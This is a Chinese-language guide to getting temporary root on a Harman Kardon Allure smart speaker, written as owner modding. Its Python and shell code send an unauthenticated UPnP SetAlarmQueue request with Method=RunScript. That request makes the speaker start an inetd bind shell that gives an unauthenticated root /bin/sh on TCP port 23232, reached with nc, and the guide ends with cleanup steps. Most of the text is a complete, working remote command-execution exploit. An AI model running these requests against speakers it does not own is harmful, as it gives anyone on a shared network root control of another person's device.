# Harman Kardon Allure：临时 root 访问方法

[返回项目说明](../README.md)

这台 Allure 的原厂 UPnP 闹钟接口接受 `Method=RunScript`，并以 root 身份执行 `Context` 中的 shell 命令。利用一次性闹钟启动原厂自带的 `inetd`，即可取得临时 root shell。整个入口不需要刷固件、解锁 bootloader、拆机或启用原厂 Telnet。

本文依据 **2026-11-01 在作者自有的一台 Harman Kardon Allure 上的实际操作记录**整理，2026-11-05 成文。测试系统为 Linux `3.10.33`、ARMv7、约 110 MB 内存、2019-09 系列固件。其他型号、固件或已经精简掉原厂 UPnP 的系统未经验证。

## 1. 原理与已验证结果

```text
同一局域网内的电脑
  → SSDP 获取设备的 description.xml 地址
  → 原厂 UPnP RenderingControl 服务
  → SetAlarmQueue，Method=RunScript，Trigger=Once
  → 到时执行 Context
  → /usr/sbin/inetd 读取 /tmp/hk-inetd.conf
  → TCP 23232 → /bin/sh，UID 0
```

实测的 SOAP 请求没有携带认证信息。这里取得的是原厂系统的 root 命令执行能力，不代表解锁了启动链，也不代表所有 Allure 都适用。

| 检查项 | 实测结果 |
|---|---|
| 创建一次性 RunScript 闹钟 | HTTP 200，返回 `SetAlarmQueueResponse` |
| 通过临时端口连接 | 可进入 `/bin/sh` |
| `id` | `uid=0(root) gid=0(root) groups=0(root)` |
| 删除指定测试闹钟 | HTTP 200，返回 `DeleteAlarmQueueResponse` |
| 关闭临时 inetd、删除临时配置 | 原厂 inetd 保留，`23232` 无法再连接 |

“Once”只限制闹钟触发次数，**不会自动关闭已经启动的 shell 服务**。最后必须执行第 5 节的清理步骤。

此端口没有密码、认证或加密，只应在自己控制的局域网中短时使用。本文不提供常驻入口；不要将端口转发到公网。

## 2. 查找真实 UPnP 端口

电脑需要 Python 3、`curl` 和 `nc`。下面的 `192.0.2.10` 是文档示例地址，请替换为自己的音箱 IPv4 地址。

在电脑终端中设置：

```sh
export SPEAKER_IP=192.0.2.10
```

向这台设备单独发送 SSDP 查询：

```sh
python3 - <<'PY'
import os
import socket
import time

ip = os.environ['SPEAKER_IP']
request = (
    'M-SEARCH * HTTP/1.1\r\n'
    'HOST: 239.255.255.250:1900\r\n'
    'MAN: "ssdp:discover"\r\n'
    'MX: 1\r\n'
    'ST: upnp:rootdevice\r\n\r\n'
).encode('ascii')
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.settimeout(1)
    sock.sendto(request, (ip, 1900))
    deadline = time.monotonic() + 4
    while time.monotonic() < deadline:
        try:
            data, peer = sock.recvfrom(8192)
        except socket.timeout:
            continue
        if peer[0] == ip:
            print(data.decode('utf-8', errors='replace'))
PY
```

从响应的 `LOCATION` 读取端口，例如：

```text
LOCATION: http://192.0.2.10:49152/description.xml
```

**不要固定写死 `49152`。** 原记录中出现过 `49152`，后来同一设备变成了 `49155`。

```sh
export UPNP_PORT=49152
curl --max-time 5 -sS "http://$SPEAKER_IP:$UPNP_PORT/description.xml"
curl --max-time 5 -sS "http://$SPEAKER_IP:$UPNP_PORT/upnp/rendercontrolSCPD.xml"
```

请根据 `description.xml` 确认服务的 `controlURL` 和 `SCPDURL`；上述路径是这台设备的实测值。实测控制地址为 `/upnp/control/rendercontrol1`，服务类型为 `urn:schemas-upnp-org:service:RenderingControl:1`，SCPD 中包含：

- `SetAlarmQueue(AlarmContext)`
- `GetAlarmQueue(AlarmName)`
- `DeleteAlarmQueue(AlarmName)`

如果没有 SSDP 响应、没有上述接口，或路径不同，应先核对设备与服务状态。HTTP 80 上的 Boa 与这个 UPnP 服务是不同入口；无需为了 root 重启或另起 Boa。

## 3. 创建一次性闹钟

以下命令都在**电脑终端**执行，生成的文件保存在电脑当前目录。实测该固件的闹钟时间使用 UTC；示例取 UPnP HTTP 响应中的设备 `Date`，预约约 90 秒后执行，不修改设备时钟。设备时间异常时，先停止并只读核对时间。

实际执行的命令只有：

```sh
printf '23232 stream tcp nowait root /bin/sh sh -i\n' > /tmp/hk-inetd.conf
/usr/sbin/inetd /tmp/hk-inetd.conf
```

先生成 SOAP 请求：

```sh
python3 - <<'PY'
import datetime as dt
import email.utils
import os
from pathlib import Path
import urllib.request
from xml.sax.saxutils import escape

base = f"http://{os.environ['SPEAKER_IP']}:{int(os.environ['UPNP_PORT'])}"
with urllib.request.urlopen(base + '/description.xml', timeout=5) as response:
    now = email.utils.parsedate_to_datetime(response.headers['Date'])
target = (now + dt.timedelta(seconds=90)).astimezone(dt.timezone.utc)
name = 'hk_root_' + target.strftime('%Y%m%dT%H%M%SZ')
command = (
    "printf '23232 stream tcp nowait root /bin/sh sh -i\\n' "
    '> /tmp/hk-inetd.conf; /usr/sbin/inetd /tmp/hk-inetd.conf'
)
fields = {
    'Name': name,
    'Time': target.strftime('%Y-%m-%d %H:%M:%S'),
    'Trigger': 'Once',
    'Method': 'RunScript',
    'DaysSpecial': '0',
    'Context': command,
    'Volume': '0',
    'Priv': name,
    'Parent': name,
    'Enable': '1',
    'PlayTime': '0',
    'Snooze': '0',
    'FadeInTime': '0',
    'UnVisible': '1',
    'SnoozeCount': '0',
}
alarm = '<AlarmInfo>' + ''.join(
    f'<{key}>{escape(value)}</{key}>' for key, value in fields.items()
) + '</AlarmInfo>'
soap = (
    '<?xml version="1.0" encoding="utf-8"?>'
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
    's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    '<s:Body><u:SetAlarmQueue '
    'xmlns:u="urn:schemas-upnp-org:service:RenderingControl:1">'
    f'<AlarmContext>{escape(alarm)}</AlarmContext>'
    '</u:SetAlarmQueue></s:Body></s:Envelope>'
)
Path('allure-root-alarm.xml').write_text(soap, encoding='utf-8')
Path('allure-root-alarm-name.txt').write_text(name + '\n', encoding='utf-8')
print('alarm:', name)
print('target UTC:', target.isoformat())
PY
```

`AlarmContext` 是一个包含 XML 的字符串，因此这里有两层 XML 转义：先转义 `Context`，再转义整段 `AlarmInfo`。不要手工去掉生成结果中的 `&lt;` 或 `&amp;`。

提交请求：

```sh
curl --max-time 10 -sS -D - \
  -H 'Content-Type: text/xml; charset="utf-8"' \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:RenderingControl:1#SetAlarmQueue"' \
  --data-binary @allure-root-alarm.xml \
  "http://$SPEAKER_IP:$UPNP_PORT/upnp/control/rendercontrol1"
```

预期得到 HTTP 200 和 `SetAlarmQueueResponse`。这只说明预约被接受；还要等待触发，再验证 root。`Volume=0`、`PlayTime=0` 配合 `RunScript` 使用，这一步不要求播放音频。

## 4. 连接并验证

到预约时间后，在电脑上连接：

```sh
nc "$SPEAKER_IP" 23232
```

进入音箱 shell 后先做只读检查：

```sh
id
uname -a
cat /proc/uptime
cat /proc/meminfo | head -20
cat /proc/mtd
ps w
```

应看到 `uid=0(root)`。`sh: can't access tty; job control turned off` 是这种无终端 shell 的正常提示。使用普通 `nc`，这里不是 Telnet 协议。

建议先备份配置、原始 MTD 分区和需要改动的文件，并在音箱与电脑两端校验哈希。本文不包含任何 Flash 写入或恢复命令；单纯取得 root 也不需要修改 `/etc/inittab`、`/etc/inetd.conf` 或启动脚本。

如后续要测试音频，先确认硬件静音。以下在**音箱 shell**执行：

```sh
amixer -c 0 sset 'Ext Spk' off
amixer -c 0 sset 'aml audio i2s mute' on
amixer -c 0 sset 'Auto Mute' on
```

不要在内存紧张时同时拉起多套播放器或原厂主控。`rootApp` 会管理原厂进程，误启动第二份 `rootApp`、Boa 端口冲突或 OOM 都曾导致报警。不要通过运行原厂守护进程的 `--help` 来探测参数：部分程序会直接启动另一份实例。

## 5. 关闭 shell，并删除测试闹钟

这两项是独立操作：删除闹钟不会停止 inetd，停止 inetd 也不会删除闹钟记录。

### 5.1 关闭临时 inetd

在当前**音箱 shell**里先定位进程：

```sh
ps w | grep '[i]netd'
```

原记录中同时存在：

```text
<stock PID>  /usr/sbin/inetd -f
<temp PID>   /usr/sbin/inetd /tmp/hk-inetd.conf
```

只对第二行的实际 PID 发送 TERM。**不要照抄旧记录中的 PID，也不要 `killall inetd`。** 在下面命令中手动替换 `<TEMP_INETD_PID>`：

```sh
kill -TERM <TEMP_INETD_PID>
rm -f /tmp/hk-inetd.conf
exit
```

然后从**电脑**尝试重新连接 `23232`，确认已经无法建立连接。若还能连接，重新检查进程归属，不要靠重启作为第一步处理。

### 5.2 删除本次创建的闹钟

回到生成 XML 的**电脑目录**，用保存的唯一名称生成删除请求：

```sh
python3 - <<'PY'
from pathlib import Path
from xml.sax.saxutils import escape

name = Path('allure-root-alarm-name.txt').read_text(encoding='utf-8').strip()
soap = (
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
    's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    '<s:Body><u:DeleteAlarmQueue '
    'xmlns:u="urn:schemas-upnp-org:service:RenderingControl:1">'
    f'<AlarmName>{escape(name)}</AlarmName>'
    '</u:DeleteAlarmQueue></s:Body></s:Envelope>'
)
Path('allure-root-delete.xml').write_text(soap, encoding='utf-8')
PY

curl --max-time 10 -sS -D - \
  -H 'Content-Type: text/xml; charset="utf-8"' \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:RenderingControl:1#DeleteAlarmQueue"' \
  --data-binary @allure-root-delete.xml \
  "http://$SPEAKER_IP:$UPNP_PORT/upnp/control/rendercontrol1"
```

预期返回 `DeleteAlarmQueueResponse`。只删除本次的 `hk_root_…` 名称，保留用户自己的闹钟。如果还没到预约时间就取消，也应删除该条目，避免它随后开启 shell。

## 6. 常见误判与范围

- **`GetAlarmQueue` 的 `AlarmName` 为空时返回 501：** 原机确实出现过，不能据此判断服务不可用。按具体名称查询；不存在或已经删除的条目也可能报错。
- **SOAP 返回 200，但端口没开：** 先检查预约时间、设备时间、真实 UPnP 端口和 XML 转义；不要连续创建大量测试闹钟。
- **重启后 UPnP 地址变了：** 重新做 SSDP 发现。持久配置和运行时端口是两回事。
- **`/usr/sbin/inetd` 不存在或接口被移除：** 本文的方法不再完整适用，不应为了复现而盲目替换固件。
- **它不是 AP2 安装步骤：** root 入口与 AirPlay 2、Alexa 精简、音频控制是不同工作。最初 AP2 4.3.6 测试的 OOM 记录，也不能代表仓库后来 5.6 方案的运行状态。

公开材料只包含通用命令与去标识后的实测结论，不包含原始 MTD 镜像、NVRAM、Wi-Fi 密码、设备 MAC、API key、维护证书、私钥或原始会话日志。上文命令示例由已验证流程整理；此次整理没有重新在音箱上执行 root 或修改固件。
